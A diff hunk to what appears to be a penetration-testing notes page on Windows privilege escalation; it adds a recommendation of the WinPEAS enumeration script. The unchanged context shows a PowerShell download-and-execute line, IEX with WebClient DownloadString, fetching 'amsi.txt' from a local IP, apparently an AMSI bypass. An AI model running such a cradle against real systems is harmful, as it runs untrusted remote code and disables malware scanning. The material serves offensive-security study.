@@ -47,3 +47,5 @@ From powershell throw this commands:
 						
 The base64 powershell encoded string was -> IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.1/amsi.txt')
 ```
+
+Additionally to this techniques I would recomend you to use the [WinPeas](https://github.com/carlospolop/PEASS-ng/) script in order to enumerate other posible privilege escalation avenues.
